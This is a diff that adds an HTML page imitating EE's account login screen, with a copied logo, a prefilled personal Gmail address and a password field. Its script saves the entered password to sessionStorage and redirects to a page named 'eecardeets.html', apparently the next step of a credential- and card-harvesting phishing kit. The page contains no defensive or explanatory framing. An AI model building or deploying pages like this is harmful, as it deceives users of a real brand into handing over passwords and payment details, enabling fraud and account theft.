@@ -1,0 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Log in – EE</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+
+    .ee-logo {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 34px;
+      margin: 0 auto 24px;
+    }
+
+    .ee-circle {
+      width: 34px;
+      height: 34px;
+      background-color: #007b8a;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+      position: relative;
+      z-index: 1;
+      margin-bottom: -4px;
+    }
+
+    .ee-circle:last-child { z-index: 0; }
+
+    .ee-circle svg {
+      width: 11px;
+      height: 16px;
+    }
+
+    .card {
+      background: #fff;
+      border: 1.5px solid #aaa;
+      border-radius: 14px;
+      padding: 40px 48px 48px;
+      width: 100%;
+      max-width: 463px;
+      position: relative;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 700;
+      color: #007b8a;
+      margin-bottom: 20px;
+    }
+
+    /* ── User row ── */
+    .user-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+
+    .user-icon {
+      width: 38px;
+      height: 38px;
+      background: #e0e0e0;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .user-icon svg {
+      width: 20px;
+      height: 20px;
+      fill: #888;
+    }
+
+    .user-info {
+      display: flex;
+      flex-direction: column;
+      gap: 2px;
+    }
+
+    .user-email {
+      font-size: 14px;
+      font-weight: 600;
+      color: #222;
+    }
+
+    .user-change {
+      font-size: 13px;
+      color: #222;
+      text-decoration: underline;
+      cursor: pointer;
+      background: none;
+      border: none;
+      padding: 0;
+      text-align: left;
+    }
+
+    .user-change:hover { color: #007b8a; }
+
+    /* ── Password ── */
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      margin-bottom: 6px;
+    }
+
+    input[type="password"],
+    input[type="text"] {
+      width: 100%;
+      height: 48px;
+      border: 1.5px solid #ccc;
+      border-radius: 8px;
+      padding: 0 14px;
+      font-size: 15px;
+      color: #222;
+      outline: none;
+      background: #f5f5f5;
+      transition: border-color 0.2s;
+    }
+
+    input:focus { border-color: #007b8a; }
+
+    /* ── Show password ── */
+    .show-password {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 12px;
+      cursor: pointer;
+    }
+
+    .show-password input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      border: 1.5px solid #aaa;
+      border-radius: 3px;
+      cursor: pointer;
+      accent-color: #007b8a;
+      flex-shrink: 0;
+    }
+
+    .show-password span {
+      font-size: 14px;
+      color: #222;
+    }
+
+    /* ── Buttons ── */
+    .btn-next {
+      width: 100%;
+      height: 48px;
+      background: #111;
+      color: #fff;
+      border: none;
+      border-radius: 999px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background 0.2s;
+    }
+
+    .btn-next:hover { background: #333; }
+
+    .forgot {
+      display: inline-block;
+      margin-top: 20px;
+      font-size: 14px;
+      color: #007b8a;
+      text-decoration: underline;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .forgot:hover { color: #005f6b; }
+
+    .btn-passkey {
+      width: 100%;
+      height: 48px;
+      background: #fff;
+      color: #111;
+      border: 2px solid #111;
+      border-radius: 999px;
+      font-size: 16px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 16px;
+      transition: background 0.2s, color 0.2s;
+    }
+
+    .btn-passkey:hover { background: #111; color: #fff; }
+
+    .about-passkeys {
+      display: inline-block;
+      margin-top: 16px;
+      font-size: 14px;
+      color: #222;
+      text-decoration: underline;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .about-passkeys:hover { color: #007b8a; }
+
+    .cancel {
+      display: inline-block;
+      margin-top: 14px;
+      font-size: 14px;
+      font-weight: 700;
+      color: #222;
+      text-decoration: underline;
+      cursor: pointer;
+      background: none;
+      border: none;
+    }
+
+    .cancel:hover { color: #007b8a; }
+
+    /* ── Tablet ── */
+    @media (max-width: 640px) {
+      body { align-items: flex-start; padding: 48px 24px; }
+
+      .card {
+        border: none;
+        border-radius: 0;
+        padding: 0;
+        max-width: 100%;
+      }
+
+      .ee-logo { margin: 0 auto 24px; }
+    }
+
+    /* ── Mobile ── */
+    @media (max-width: 400px) {
+      .ee-circle { width: 30px; height: 30px; }
+      .ee-circle svg { width: 9px; height: 14px; }
+      h1 { font-size: 20px; }
+      input[type="password"], input[type="text"], .btn-next, .btn-passkey { height: 46px; font-size: 15px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+
+    <div class="ee-logo">
+      <div class="ee-circle">
+        <svg viewBox="0 0 56 84" xmlns="http://www.w3.org/2000/svg">
+          <rect x="0" y="0" width="14" height="84" rx="1" fill="white"/>
+          <rect x="0" y="0" width="56" height="14" rx="1" fill="white"/>
+          <rect x="0" y="35" width="44" height="14" rx="1" fill="white"/>
+          <rect x="0" y="70" width="56" height="14" rx="1" fill="white"/>
+        </svg>
+      </div>
+      <div class="ee-circle">
+        <svg viewBox="0 0 56 84" xmlns="http://www.w3.org/2000/svg">
+          <rect x="0" y="0" width="14" height="84" rx="1" fill="white"/>
+          <rect x="0" y="0" width="56" height="14" rx="1" fill="white"/>
+          <rect x="0" y="35" width="44" height="14" rx="1" fill="white"/>
+          <rect x="0" y="70" width="56" height="14" rx="1" fill="white"/>
+        </svg>
+      </div>
+    </div>
+
+    <h1>Log in</h1>
+
+    <div class="user-row">
+      <div class="user-icon">
+        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
+        </svg>
+      </div>
+      <div class="user-info">
+        <span class="user-email">lewiswalkz81@gmail.com</span>
+        <button class="user-change">Change email or username</button>
+      </div>
+    </div>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" autocomplete="current-password"/>
+
+    <label class="show-password">
+      <input type="checkbox" onchange="togglePassword(this)"/>
+      <span>Show password</span>
+    </label>
+
+    <button class="btn-next">Next</button>
+
+    <script>
+        function handleNext() {
+          const password = document.getElementById('password').value;
+      
+          sessionStorage.setItem('password', password);
+          window.location.href = 'eecardeets.html';
+        }
+      </script>
+
+    <br/>
+    <button class="forgot">Forgot your password?</button>
+
+    <button class="btn-passkey">Continue with a passkey</button>
+
+    <br/>
+    <button class="about-passkeys">About Passkeys</button>
+
+    <br/>
+    <button class="cancel">Cancel</button>
+
+  </div>
+
+  <script>
+    function togglePassword(checkbox) {
+      const input = document.getElementById('password');
+      input.type = checkbox.checked ? 'text' : 'password';
+    }
+  </script>
+</body>
+</html>
